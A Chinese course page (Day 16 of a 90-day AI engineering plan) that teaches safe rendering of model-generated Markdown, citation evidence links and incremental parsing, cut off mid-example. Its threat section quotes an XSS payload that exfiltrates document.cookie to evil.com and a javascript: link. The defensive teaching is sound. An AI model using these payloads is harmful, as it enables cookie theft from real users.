@@ -1,0 +1,1925 @@
+<!DOCTYPE html><html lang="zh-CN"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Day 16 · 证据与 XSS（v1 裸渲染 Markdown → v2 白名单净化 + URL 协议校验 → v3 增量解析 + 证据链 + 长内容性能） | 学习计划</title>
+  <link rel="icon" href="data:,">
+  <link rel="stylesheet" href="/ai-teacher-agent-devolop/reader.css">
+  <script defer="" src="/ai-teacher-agent-devolop/reader.js"></script>
+</head>
+<body>
+  <a class="skip" href="#content">跳到正文</a>
+  <header class="topbar">
+    <a class="brand" href="/ai-teacher-agent-devolop/" aria-label="学习计划首页"><span class="brand-mark" aria-hidden="true">AI</span><span>学习计划</span></a>
+    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="plan-menu">课程目录</button>
+    <div class="topbar-actions">
+      <a class="back-link" data-back="" href="/ai-teacher-agent-devolop/">← 返回</a>
+    </div>
+  </header>
+  <div class="layout">
+    <aside class="sidebar" id="plan-menu">
+    <nav aria-label="学习计划目录">
+      <div class="sidebar-heading"><strong>课程目录</strong><span>13 周 · 90 天</span></div>
+      <ul class="overview-links">
+        <li><a href="/ai-teacher-agent-devolop/course/index.html">课程总览</a></li>
+        <li><a href="/ai-teacher-agent-devolop/course/days.html">逐日任务索引</a></li>
+      </ul>
+      <div class="week-list">
+        <details class="week">
+          <summary><span>第 1 周</span><span class="week-range">Day 01–07</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/01.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/01.html">
+                <span class="day-label">Day 01</span><span>AI 前端架构</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/02.html">
+                <span class="day-label">Day 02</span><span>领域合同</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/03.html">
+                <span class="day-label">Day 03</span><span>异步与竞态</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/04.html">
+                <span class="day-label">Day 04</span><span>Vue/ECharts 原理</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/05.html">
+                <span class="day-label">Day 05</span><span>WebSocket 全栈</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/06.html">
+                <span class="day-label">Day 06</span><span>实时可靠性</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/07.html">
+                <span class="day-label">Day 07</span><span>事件与算法</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 2 周</span><span class="week-range">Day 08–14</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/02.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/08.html">
+                <span class="day-label">Day 08</span><span>API/分页</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/09.html">
+                <span class="day-label">Day 09</span><span>状态机</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/10.html">
+                <span class="day-label">Day 10</span><span>M2 门禁</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/11.html">
+                <span class="day-label">Day 11</span><span>Tool Registry</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/12.html">
+                <span class="day-label">Day 12</span><span>Agent Loop</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/13.html">
+                <span class="day-label">Day 13</span><span>持久化/幂等</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/14.html">
+                <span class="day-label">Day 14</span><span>SSE 合同演进</span>
+              </a></li>
+          </ul>
+        </details><details class="week" open="">
+          <summary><span>第 3 周</span><span class="week-range">Day 15–21</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/03.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/15.html">
+                <span class="day-label">Day 15</span><span>Agent 时间线</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/16.html" aria-current="page">
+                <span class="day-label">Day 16</span><span>证据与 XSS</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/17.html">
+                <span class="day-label">Day 17</span><span>Human-in-the-loop</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/18.html">
+                <span class="day-label">Day 18</span><span>Trace/性能</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/19.html">
+                <span class="day-label">Day 19</span><span>生产演练</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/20.html">
+                <span class="day-label">Day 20</span><span>项目毕业考</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/21.html">
+                <span class="day-label">Day 21</span><span>NestJS 架构深化</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 4 周</span><span class="week-range">Day 22–28</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/04.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/22.html">
+                <span class="day-label">Day 22</span><span>API 合同</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/23.html">
+                <span class="day-label">Day 23</span><span>数据建模</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/24.html">
+                <span class="day-label">Day 24</span><span>鉴权/权限</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/25.html">
+                <span class="day-label">Day 25</span><span>后端测试</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/26.html">
+                <span class="day-label">Day 26</span><span>流式 BFF</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/27.html">
+                <span class="day-label">Day 27</span><span>Postgres 持久化</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/28.html">
+                <span class="day-label">Day 28</span><span>Redis</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 5 周</span><span class="week-range">Day 29–35</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/05.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/29.html">
+                <span class="day-label">Day 29</span><span>队列/BullMQ</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/30.html">
+                <span class="day-label">Day 30</span><span>月度门禁</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/31.html">
+                <span class="day-label">Day 31</span><span>Tool Registry v2</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/32.html">
+                <span class="day-label">Day 32</span><span>Orchestrator</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/33.html">
+                <span class="day-label">Day 33</span><span>Durable HITL</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/34.html">
+                <span class="day-label">Day 34</span><span>失败恢复</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/35.html">
+                <span class="day-label">Day 35</span><span>可观测性</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 6 周</span><span class="week-range">Day 36–42</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/06.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/36.html">
+                <span class="day-label">Day 36</span><span>API 安全</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/37.html">
+                <span class="day-label">Day 37</span><span>性能</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/38.html">
+                <span class="day-label">Day 38</span><span>稳定性</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/39.html">
+                <span class="day-label">Day 39</span><span>Agent 指标</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/40.html">
+                <span class="day-label">Day 40</span><span>Node 全栈门禁</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/41.html">
+                <span class="day-label">Day 41</span><span>Python 工程边界</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/42.html">
+                <span class="day-label">Day 42</span><span>FastAPI</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 7 周</span><span class="week-range">Day 43–49</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/07.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/43.html">
+                <span class="day-label">Day 43</span><span>模型网关</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/44.html">
+                <span class="day-label">Day 44</span><span>结构化输出</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/45.html">
+                <span class="day-label">Day 45</span><span>Prompt 版本</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/46.html">
+                <span class="day-label">Day 46</span><span>RAG 摄取</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/47.html">
+                <span class="day-label">Day 47</span><span>Embedding/pgvector</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/48.html">
+                <span class="day-label">Day 48</span><span>Hybrid/Rerank</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/49.html">
+                <span class="day-label">Day 49</span><span>RAG 引用闭环</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 8 周</span><span class="week-range">Day 50–56</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/08.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/50.html">
+                <span class="day-label">Day 50</span><span>五十日门禁</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/51.html">
+                <span class="day-label">Day 51</span><span>RAG Eval</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/52.html">
+                <span class="day-label">Day 52</span><span>LLM Eval</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/53.html">
+                <span class="day-label">Day 53</span><span>LangChain 适用边界</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/54.html">
+                <span class="day-label">Day 54</span><span>多租户/权限</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/55.html">
+                <span class="day-label">Day 55</span><span>Docker Compose</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/56.html">
+                <span class="day-label">Day 56</span><span>CI/CD</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 9 周</span><span class="week-range">Day 57–63</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/09.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/57.html">
+                <span class="day-label">Day 57</span><span>监控/Trace</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/58.html">
+                <span class="day-label">Day 58</span><span>事故演练</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/59.html">
+                <span class="day-label">Day 59</span><span>求职证据</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/60.html">
+                <span class="day-label">Day 60</span><span>AI 全栈毕业考</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/61.html">
+                <span class="day-label">Day 61</span><span>Agent 系统分层</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/62.html">
+                <span class="day-label">Day 62</span><span>双 Agent/Event Sourcing</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/63.html">
+                <span class="day-label">Day 63</span><span>双 CLI Runtime</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 10 周</span><span class="week-range">Day 64–70</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/10.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/64.html">
+                <span class="day-label">Day 64</span><span>双 CLI 流协议</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/65.html">
+                <span class="day-label">Day 65</span><span>协同 Context</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/66.html">
+                <span class="day-label">Day 66</span><span>角色/CLI 权限</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/67.html">
+                <span class="day-label">Day 67</span><span>Tool Loop/Validator</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/68.html">
+                <span class="day-label">Day 68</span><span>协同 Memory/RAG</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/69.html">
+                <span class="day-label">Day 69</span><span>Worktree/DAG 并行</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/70.html">
+                <span class="day-label">Day 70</span><span>多 Agent 主链路门禁</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 11 周</span><span class="week-range">Day 71–77</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/11.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/71.html">
+                <span class="day-label">Day 71</span><span>MCP 设计</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/72.html">
+                <span class="day-label">Day 72</span><span>MCP Server</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/73.html">
+                <span class="day-label">Day 73</span><span>MCP Runtime Adapter</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/74.html">
+                <span class="day-label">Day 74</span><span>MCP 权限治理</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/75.html">
+                <span class="day-label">Day 75</span><span>Human Runtime</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/76.html">
+                <span class="day-label">Day 76</span><span>Agent 审批 UX</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/77.html">
+                <span class="day-label">Day 77</span><span>Durable 恢复</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 12 周</span><span class="week-range">Day 78–84</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/12.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/78.html">
+                <span class="day-label">Day 78</span><span>RAG Eval</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/79.html">
+                <span class="day-label">Day 79</span><span>Hybrid RAG</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/80.html">
+                <span class="day-label">Day 80</span><span>MCP/Human/RAG 门禁</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/81.html">
+                <span class="day-label">Day 81</span><span>动态委派语义</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/82.html">
+                <span class="day-label">Day 82</span><span>自主委派调度</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/83.html">
+                <span class="day-label">Day 83</span><span>并行冲突/Handoff</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/84.html">
+                <span class="day-label">Day 84</span><span>对抗 Validation Agent</span>
+              </a></li>
+          </ul>
+        </details><details class="week">
+          <summary><span>第 13 周</span><span class="week-range">Day 85–90</span></summary>
+          <ul>
+            <li class="week-overview"><a href="/ai-teacher-agent-devolop/week/13.html">本周总览</a></li>
+            <li><a href="/ai-teacher-agent-devolop/day/85.html">
+                <span class="day-label">Day 85</span><span>Agent Eval</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/86.html">
+                <span class="day-label">Day 86</span><span>Trace/Replay/A-B</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/87.html">
+                <span class="day-label">Day 87</span><span>SLO/成本/告警</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/88.html">
+                <span class="day-label">Day 88</span><span>Chaos/可靠性</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/89.html">
+                <span class="day-label">Day 89</span><span>生产就绪/求职</span>
+              </a></li><li><a href="/ai-teacher-agent-devolop/day/90.html">
+                <span class="day-label">Day 90</span><span>最终答辩</span>
+              </a></li>
+          </ul>
+        </details>
+      </div>
+      <details class="week materials">
+        <summary>课程资料</summary>
+        <ul><li><a href="/ai-teacher-agent-devolop/course/guide.html">项目课程说明</a></li>
+        <li><a href="/ai-teacher-agent-devolop/materials/output/30%E5%A4%A9AI%E5%89%8D%E7%AB%AF%E8%BD%AC%E5%9E%8B%E8%AE%A1%E5%88%92-2026-07-14.html">30 天 AI 前端转型计划</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/90%E5%A4%A9%E6%8B%86%E5%88%86%E8%A7%84%E5%88%99%E8%AF%B4%E6%98%8E.html">90 天拆分规则说明</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/90%E5%A4%A9%E5%B2%97%E4%BD%8D%E9%A9%B1%E5%8A%A8%E9%A1%B9%E7%9B%AE%E8%AF%BE%E7%A8%8B-v2.html">90 天岗位驱动项目课程 v2</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/90%E5%A4%A9AI%E5%85%A8%E6%A0%88%E4%B8%8EAgent%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AE%A1%E5%88%92-2026-07-14.html">90 天 AI 全栈与 Agent 工程师计划</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E7%AC%AC%E4%B8%80%E8%8A%82%E7%82%B9Day1-20%E6%AF%8F%E6%97%A5%E4%BB%BB%E5%8A%A1%E4%B8%8E%E8%AF%84%E5%88%86%E6%A0%87%E5%87%86.html">第一节点 Day 1-20 高级前端架构视角项目任务与评分标准</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E9%AB%98%E7%BA%A7%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84%E8%A7%86%E8%A7%92%E6%95%99%E5%AD%A6%E6%80%BB%E7%BA%B2.html">高级前端架构视角教学总纲</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E7%AE%80%E5%8E%86%E7%94%A8%E8%AF%8D%E7%BA%A2%E7%BA%BF%E8%87%AA%E6%A3%80%E6%B8%85%E5%8D%95.html">简历用词红线自检清单</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E6%95%99%E5%AD%A6%E6%96%87%E6%A1%A3%E8%A7%84%E8%8C%83-Day%E9%A3%8E%E6%A0%BC%E4%B8%8E%E6%B7%B1%E6%8C%96HTML%E8%A7%84%E8%8C%83-v3-%E7%9C%9F%E5%AE%9E%E9%A3%8E%E6%A0%BC.html">教学文档规范 · Day 风格与深挖 HTML 规范（v3 真实风格版）</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E6%95%99%E5%AD%A6%E6%96%87%E6%A1%A3%E8%A7%84%E8%8C%83-Day%E9%A3%8E%E6%A0%BC%E4%B8%8E%E6%B7%B1%E6%8C%96HTML%E8%A7%84%E8%8C%83.html">教学文档规范 · Day 风格与深挖 HTML 规范（v2）</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E8%81%94%E7%BD%91%E8%B0%83%E7%A0%94%E4%B8%8E%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AE%E9%A2%98%E6%9D%A5%E6%BA%90-2026-07-13.html">联网调研与真实项目题来源</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E6%AF%8F%E6%97%A5%E4%BB%BB%E5%8A%A1%E5%88%86%E5%8F%91%E5%8D%8F%E8%AE%AE.html">每日任务分发协议</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E4%B8%AD%E5%9B%BDAI%E5%89%8D%E7%AB%AF%E4%B8%8EAgent%E5%B2%97%E4%BD%8D%E5%8A%A8%E6%80%81-2026-07-13.html">中国 AI 前端与 Agent 岗位动态</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/%E8%B5%84%E6%BA%90%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%95.html">前端与 AI 面试资源知识索引</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/AI%E6%95%99%E5%B8%88%E6%AF%8F%E6%97%A5%E4%B8%89%E9%97%AE%E6%89%A7%E8%A1%8C%E5%8D%8F%E8%AE%AE.html">兼容入口：每日三问协议已升级为五连问</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/AI%E6%95%99%E5%B8%88%E4%BA%94%E8%BF%9E%E9%97%AE%E9%AA%8C%E6%94%B6%E5%8D%8F%E8%AE%AE.html">AI 教师五连问验收协议</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/AI%E5%89%8D%E7%AB%AF%E5%88%B0AI-Agent%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%88%90%E9%95%BF%E8%B7%AF%E7%BA%BF.html">AI 前端 -&gt; AI 全栈 -&gt; AI Agent 工程师成长路线</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/Day01%E4%BB%BB%E5%8A%A1%E5%8D%95-AI%E5%89%8D%E7%AB%AF%E6%9E%B6%E6%9E%84%E4%B8%8EAgent%E4%BA%8B%E4%BB%B6%E6%A8%A1%E5%9E%8B.html">Day 1 任务单：AI 前端架构与 Agent 事件模型</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/Day01%E6%B7%B1%E6%8C%96-%E5%89%8D%E7%AB%AF%E5%BA%95%E5%AD%90%E8%A1%A5%E5%BC%B1.html">Day01 深挖 · 前端底子补弱</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/Day02-90%E9%A1%B9%E7%9B%AE%E9%A9%B1%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%80%BB%E7%BA%B2.html">Day 2-90 项目驱动任务总纲</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/Day02%E6%B7%B1%E6%8C%96-%E9%A2%86%E5%9F%9F%E5%90%88%E5%90%8C%E5%BA%95%E5%AD%90%E8%A1%A5%E5%BC%B1.html">Day02 深挖 · 领域合同底子补弱</a></li><li><a href="/ai-teacher-agent-devolop/materials/output/p2-agent-workbench%E9%A1%B9%E7%9B%AE%E8%BE%B9%E7%95%8C.html">p2-agent-workbench 项目边界</a></li></ul>
+      </details>
+    </nav>
+  </aside>
+    <main id="content" tabindex="-1">
+      <nav class="breadcrumbs" aria-label="当前位置">
+        <a href="/ai-teacher-agent-devolop/course/index.html">课程总览</a>
+        <a href="/ai-teacher-agent-devolop/week/03.html">第 3 周</a>
+        
+      </nav>
+      <header class="article-header">
+        <p class="article-day">Day 16</p>
+        <h1>证据与 XSS（v1 裸渲染 Markdown → v2 白名单净化 + URL 协议校验 → v3 增量解析 + 证据链 + 长内容性能）</h1>
+      </header>
+      <div class="article-layout">
+        <article class="prose">
+          <blockquote>
+<p><strong>《90 天拆分规则说明》校正口径（本节优先于正文中的旧阶段编号和旧时间表）</strong></p>
+<ul>
+<li><strong>路线位置</strong>：阶段一（Day 1-30，前端 -&gt; AI 前端）。所有 BFF、NestJS、数据库、队列和 Agent 后端增量都必须服务于 <code>p1-monitor</code> 的真实 AI 前端链路，不得另起无关 Demo。</li>
+<li><strong>功能交付</strong>：本日必须交付一个能跑、能测、能从用户入口观察结果的完整模块；知识点只能由该模块自然引出。</li>
+<li><strong>三版演进</strong>：正文 §3/§4/§5 分别对应 v1 最小闭环、v2 增加一个关键设计维度、v3 生产终态；v1/v2 必须写明可观察痛点，v3 必须解决这些痛点。</li>
+<li><strong>时间盒</strong>：本日执行 180 分钟标准时间盒：A/B/C 各 30 分钟（共 90 分钟阅读）；D 60 分钟、E 20 分钟、F 10 分钟（共 90 分钟动手）。正文其他旧时间表不再作为执行口径。</li>
+<li><strong>累积复用</strong>：开始前读取上一日 commit 和当前源码；当天新增合同必须复用已有事件、Schema、状态或持久化边界，禁止复制出第二套平行实现。</li>
+<li><strong>验收门槛</strong>：核心测试 + 两个产生不同可观察失败的反证实验 + 课末三问 + 至少两道真实项目情境题 + 提交后动态教师五连问，缺一项即不通过。</li>
+</ul>
+</blockquote>
+<p>任务版本：标准版
+日期与时长：2026-07-29 周三，180 分钟（90 分钟阅读 + 90 分钟动手）
+项目：<code>D:\demo\ai-techer\p1-monitor\frontend</code>
+角色视角：完成 Day 15 Agent 时间线（历史回放 + 派生状态 + 审计面板），第一次要把「模型生成的 Markdown 诊断报告」安全渲染到页面、并把每条结论链接回真实证据的开发者</p>
+<hr>
+<h2 id="0-今天在-90-天路线中的位置">0. 今天在 90 天路线中的位置</h2>
+<p>90 天转型路线的三个阶段：</p>
+<pre><code>阶段一（Day 1-30）：前端 → AI 前端
+   项目：p1-monitor 智能运维监控（Vue 3 + TypeScript + WebSocket + Agent UI）
+   Day 1-5：前端 Agent 运行时展示、状态机、WebSocket 实时
+   Day 6-10：后端 Nest + Prisma + FSM + M2 门禁
+
+阶段二（Day 31-60）：AI 前端 → AI 全栈
+   项目：p1-monitor 后端 + p1-monitor 全栈（NestJS + LLM 集成 + RAG）
+   Day 11：Tool Registry（Schema/超时/裁剪/审计）
+   Day 12：Agent Loop（循环调用+预算+终止）
+   Day 13：持久化 / 幂等（事务+幂等键+执行状态+恢复）
+   Day 14：SSE 合同演进（AgentEventV1 + resume + 取消）
+   Day 15：Agent 时间线（Event reducer + 派生状态 + 持久化恢复 + 审计 UI）
+   Day 16：证据与 XSS（安全 Markdown + 证据链 + 长内容性能）  ← 今天在这里
+   Day 17-20：LangChain RAG + 向量检索
+
+阶段三（Day 61-90）：AI 全栈 → AI Agent 工程师
+   项目：p2-agent-workbench 多 Agent 协同工作台
+</code></pre>
+<p><strong>Day 16 在阶段一第 6 天</strong>。Day 12 让 Agent 循环调工具、Day 13 落库、Day 14/15 让事件实时推到前端并能回放。到今天为止，模型生成的最终诊断结论一直是<strong>一段纯文本</strong>塞在 timeline 的 <code>result</code> 卡片里。但真实产品里，模型输出的是 <strong>Markdown</strong>（带标题、列表、代码块、<code>[1]</code> 引用标记），而 Markdown 一旦用 <code>v-html</code> 直接渲染，就是 XSS 的头号入口。今天要解决两件事：<strong>安全渲染</strong>（模型输出不可信，等同用户输入）+ <strong>证据链</strong>（每条结论能点回真实的指标/异常/ToolCall）。</p>
+<h3 id="到-day-15-结束时项目已具备的能力">到 Day 15 结束时项目已具备的能力</h3>
+<ul>
+<li><strong>前端时间线</strong>（Day 15）：<code>useAgentTimeline</code> 编排历史 + SSE、派生 Run/Tool/Approval/RawEvents 四视图、审计面板、sessionStorage 恢复</li>
+<li><strong>后端持久化</strong>（Day 13）：AgentRun / Diagnosis / ToolCall 三表落库，每条 ToolCall 有 <code>id</code>、<code>toolName</code>、<code>resultJson</code></li>
+<li><strong>诊断结论的现状</strong>：<code>Diagnosis.summary</code> 是一段字符串，前端拿到后直接当纯文本显示；模型其实已经在生成 Markdown（<code>## 诊断结论\n\n- CPU 持续超过阈值 [1]\n- ...</code>），但前端把 <code>##</code>、<code>-</code>、<code>[1]</code> 当普通字符显示，既丑又没有引用跳转</li>
+<li><strong>缺失的一块</strong>：没有 Markdown 渲染层；没有 XSS 防护；模型说的"[1]"指向哪条 ToolCall 没人知道；30KB 的长报告流式渲染时每个 chunk 全量重新解析，CPU 飙高</li>
+</ul>
+<h3 id="今天要解决的-4-个问题">今天要解决的 4 个问题</h3>
+<ol>
+<li>
+<p><strong>问题 1：<code>v-html</code> 直接渲染模型 Markdown = XSS 门户大开</strong>
+模型输出不可信——它可能被 prompt 注入、可能把用户上一轮粘贴的恶意内容复述出来、可能因为 RAG 检索到污染文档而生成 <code>&lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</code>。如果前端 <code>&lt;div v-html="markdownToHtml(summary)"&gt;</code>，浏览器会执行 <code>onerror</code> 里的脚本，窃取 Cookie、发起钓鱼跳转。<strong>模型输出必须和用户输入一样，经过 Markdown 白名单解析 + DOMPurify 净化才能进 DOM</strong>。</p>
+</li>
+<li>
+<p><strong>问题 2：危险 URL 协议（<code>javascript:</code> / <code>data:</code>）绕过 HTML 净化</strong>
+即使把 <code>&lt;script&gt;</code> 和 <code>onerror</code> 都过滤了，模型生成的 <code>[点这里查看详情](javascript:alert(document.cookie))</code> 仍然是活的——它是合法的 <code>&lt;a&gt;</code> 标签，但 <code>href</code> 里是 <code>javascript:</code> 伪协议。用户一点就中招。<strong>必须对所有 <code>href</code> / <code>src</code> 做协议白名单校验（只允许 <code>http/https/mailto</code>）</strong>。</p>
+</li>
+<li>
+<p><strong>问题 3：证据链断裂——模型说的"[1]"指向哪里没人知道</strong>
+模型输出"CPU 在 14:30 持续超过阈值 [1]，磁盘 IO 正常 [2]"。这里的 <code>[1]</code> <code>[2]</code> 应该分别链接到具体的 ToolCall（<code>getMetrics</code> 的返回）和 Anomaly 记录。如果只是显示 <code>[1]</code> 纯文本，运维无法验证"模型这个结论是基于哪条真实数据得出的"，诊断报告就成了不可信的黑盒。<strong>必须把 <code>[n]</code> 解析成可点击的引用，点击后定位到审计面板里对应的 ToolCall / 指标 / 异常</strong>。</p>
+</li>
+<li>
+<p><strong>问题 4：长报告流式渲染 CPU 飙高</strong>
+30KB 的诊断报告通过 SSE 一个 chunk 一个 chunk 推来。如果每收到一个 <code>text.delta</code> 就把<strong>累积的全部文本</strong>重新 <code>marked.parse()</code> 一遍，解析次数是 O(N²)（第 k 个 chunk 解析前 k 个 chunk 的全部内容）。报告越长越卡，CPU 到 95%，页面掉帧。<strong>必须做增量解析 / 节流，只在必要时重新解析，或只解析新增部分</strong>。</p>
+</li>
+</ol>
+<hr>
+<h2 id="1-今天要交付的功能模块">1. 今天要交付的功能模块</h2>
+<p>在 <code>p1-monitor/frontend</code> 里交付一个模块 <strong><code>agent/report</code></strong>：把模型生成的 Markdown 诊断报告安全渲染到诊断详情页。核心是一条<strong>不可信内容 → 安全 DOM</strong> 的净化管线（Markdown 白名单解析 → DOMPurify 净化 → URL 协议校验），加上把 <code>[n]</code> 引用标记解析成可点击链接、点击后跳转到审计面板对应证据的证据链机制，以及长报告的增量解析 + 节流渲染。</p>
+<h3 id="11-用户能看到什么">1.1 用户能看到什么</h3>
+<p><strong>场景</strong>：运维工程师打开 <code>/runs/r-01</code> 诊断详情页，Agent 已经生成了一份 Markdown 诊断报告，其中混入了一段被污染的恶意内容。</p>
+<pre><code>模型原始输出（不可信）：
+
+## 诊断结论
+
